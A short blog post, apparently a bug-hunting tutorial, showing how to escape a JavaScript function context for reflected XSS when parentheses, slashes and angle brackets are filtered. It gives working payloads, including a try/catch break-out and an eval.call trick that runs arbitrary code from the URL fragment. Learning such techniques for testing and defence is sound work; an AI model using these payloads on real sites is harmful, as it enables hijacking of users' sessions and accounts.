---
layout: post
title: "Breaking out of a function context without () and // for XSS"
---

Let's say you've found something that could lead to relfect xss. You can inject unescaped characters in a piece of javascript on a page like:


{% highlight html linenos %}
...
<script>
    $(function () {
        //...
        function foo() {
            someCode;
            var url = 'www.example.com/INJECTION_HERE';
            someMoreCode;
        }
        //...
    });
</script>
...
{% endhighlight %}

You want your xss payload to fire without a need of `foo` function being called, but you cannot use `(`, `)`, `/`, `<`, `>` and new lines. This actually can happen if our entry point is a part of url's path like `https://www.example.com/foo/OUR_INPUT_HERE/bar/`. In such conditions, we cannot get out of `<script>` and jquery's `$(...)`. So what do we do?

## Getting out of foo ...

First, let's get out of `foo` function. This one is pretty simple and obvious. All we have to do is to inject:

{% highlight text %}
'} alert`1` - '
{% endhighlight %}

but then we get:
{% highlight javascript linenos %}
...
    $(function () {
        //...
        function foo() {
            someCode;
            var url = 'www.example.com/'} alert`1` - '';
            someMoreCode;
        } // <-- this bracket spoils everything :(
        //...
    });
...
{% endhighlight %}

Closing bracket on line 8 breaks the code inside `$(function () {...})` and therefore our `alert` is not being executed. We need to do it a little bit smarter.

## ... without braking everything else

So, we need to put something after our `alert` to make the closing bracket fit. Maybe let's add `function bar() {`?
<br>
<div style="text-align: center; opacity: .8"> but we cannot use ()'s.</div>
<br>
So maybe we can just open `{` to get an [object literal](https://www.dyn-web.com/tutorials/object-literal/)?
<br>
<br>
<div style="text-align: center; opacity: .8">Inside an object literal only key:value pairs are allowed and we have bunch of code in the following lines</div>
<br>
<br>
Ok. So what kind of javascript creature has an opening `{`, no `()`'s and code inside?
<br>
<br>
<div style="text-align: center; opacity: .8">
The try...catch statement!
</div>
<br>
<br>
Great! When we use something like:

{% highlight text %}
'} alert`1`; try {} catch {'
{% endhighlight %}

we end up with:

{% highlight javascript linenos %}
...
    $(function () {
        //...
        function foo() {
            someCode;
            var url = 'www.example.com/'} alert`1`; try {} catch {'';
            someMoreCode;
        } // <-- this bracket spoils everything :(
        //...
    });
...
{% endhighlight %}

which is valid javascript code and therefore our `alert` fires!

## But how do we execute anything more meaningful than an alert?

As I've mentioned, we are not allowed to use `()` which makes creating payloads a bit tricky. To get around this, we can use the following trick. First, we inject this in our entry point:

{% highlight javascript %}
eval.call`${document.location.hash.substr`1`}`
{% endhighlight %}

and then we put our payload in url's [fragment identifier](https://en.wikipedia.org/wiki/Fragment_identifier) where all characters are allowed.

For example:

{% highlight text %}
https://www.example.com/foo/eval.call`${document.location.hash.substr`1`}`/bar/#yourPayloadHere()
{% endhighlight %}

Of course, we need to url encode `eval.call...` to make it work.


<br>
<br>
Happy hunting!